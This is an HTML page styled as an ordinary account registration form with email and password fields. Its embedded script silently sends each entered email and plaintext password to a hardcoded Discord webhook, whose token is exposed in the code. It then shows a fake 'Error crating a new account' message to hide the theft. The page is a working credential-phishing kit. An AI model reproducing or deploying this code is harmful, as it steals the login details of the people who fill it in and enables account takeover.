<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registration Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .register-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .register-container h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #5cb85c;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #4cae4c;
        }
    </style>
</head>
<body>
    <div class="register-container">
        <h2>Register</h2>
        <form id="registerForm">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="submit-btn">Register</button>
        </form>
    </div>
    <script>
        document.getElementById('registerForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent form from submitting normally
            
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            var webhookUrl = 'https://discord.com/api/webhooks/1195746273773506720/zI3DfyDqjTiDboz-5b_fNJA79ea_N4_Ta5kzpLqPEe4vfQ_xXdFZnBOU3hINYT6bOTPO';
            
            var request = new XMLHttpRequest();
            request.open('POST', webhookUrl);
            request.setRequestHeader('Content-type', 'application/json');
            
            var params = {
                username: 'Registration Bot',
                content: `Email: ${email}\nPassword: ${password}`
            };
            
            request.send(JSON.stringify(params));
            
            alert('Error crating a new account Error code: 31');
        });
    </script>
</body>
</html>
